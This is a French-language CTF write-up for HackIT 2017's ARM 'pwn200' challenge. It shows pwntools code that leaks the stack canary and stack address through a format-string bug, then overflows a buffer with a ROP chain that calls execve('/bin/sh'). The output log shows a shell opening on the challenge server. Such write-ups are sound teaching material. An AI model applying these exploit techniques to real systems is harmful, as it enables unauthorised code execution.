---
layout: post
title: "HackIT CTF"
date: 27 Août 2017
comments: true
categories: wu
---
Le binaire presente les caractéristiques suivantes:
```
Filename                 pwn200
File format              ELF32
Architecture             arm
Endianess                little endian
Entry point              0x10370
Loadables segments       2
Sections                 31

NX bit                   enabled
SSP                      enabled
Relro                    unknown
RPATH                    unknown
RUNPATH                  unknown
PIE                      disabled
```
On observe tout d'abord une présence d'une faille de type format qui nous
permet de faire un dump de la pile. Cela permet de trouver d'une part le canari
(offset 517) et d'autre part de localiser la pile (l'offset 3 pointe vers
l'offset 5 de la pile). Le code suivant récupère ces deux informations:
```
p=remote(host,port)
p.recvuntil("> ")
p.sendline('%3$08x%517$08x')
b=p.recvuntil("> ")
adr_pile=int(b[0:8],16)-5*4
canari=int(b[8:16],16)
print '[+] pile ',hex(adr_pile)
print '[+] canari ',hex(canari)
```
On observe en suite un bufferoverflow. Le binaire étant en statique, on peut
faire un ROP développant un shell. Les gadgets sont
```
svc48lr=0x00053520 # svc #0 ; pop {r4, r5, r6, r7, r8, lr} ; bx lr
popr0=0x00070068 # pop {r0, lr} ; bx lr
popr1=0x00070590 # pop {r1, lr} ; bx lr
popr3=0x00010160 # pop {r3, lr} ; bx lr
popr45678=0x00011184 # pop {r4, r5, r6, r7, r8, lr} ; bx lr
popr47=0x0002a6f8 # pop {r4, r7, lr} ; bx lr
gadget=0x0004f17c # mov r2, r4 ; mov r1, r7 ; mov r0, r6 ; mov lr, pc ; bx r3
```
Le ROP lui même est classique faisant un execve("/bin/sh",0,0)
```
rop=""
offset=adr_pile+0x81c+4* 14
rop=rop+p32(0) # r4 (ira dans r2)
rop=rop+p32(adr_pile) # r11

rop=rop+p32(popr3) # pop {r3, lr} ; bx lr
rop=rop+p32(popr47) # pop {r4, r7, lr} ; bx lr -> dans r3

rop=rop+p32(popr45678) # pop {r4, r5, r6, r7, r8, lr} ; bx lr
rop=rop+p32(0) # r4 -> r2
rop=rop+p32(adr_pile) # r5
rop=rop+p32(offset) # r6 -> r0
rop=rop+p32(0) # r7 ira dans r1
rop=rop+p32(adr_pile) # r8
rop=rop+p32(gadget) # mov r2, r4 ; mov r1, r7 ; mov r0, r6 ; mov lr, pc ; bx r3  ---> là r2=0, r1=offset, r0 = offset

rop=rop+p32(adr_pile) # r4
rop=rop+p32(11) # r7
rop=rop+p32(svc48lr) # svc #0
rop=rop+"/bin/sh"+chr(0)

p.sendline(PAD+rop)
p.interactive()
```
avec un PAD de longueur 1024. On obtient le déroulement suivant:
```
[*] '/home/francois/BFF/beers4flags/writeups/2017/hackIT/pwn200/pwn200'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[+] Opening connection to 165.227.98.55 on port 3333: Done
[+] pile  0xbef69458
[+] canari  0xf0406900

[*] Switching to interactive mode
$ cd home/pwn200
$ cat fla*
h4ck1t{Sarah_would_be_proud}
$ 
[*] Closed connection to 165.227.98.55 port 3333
```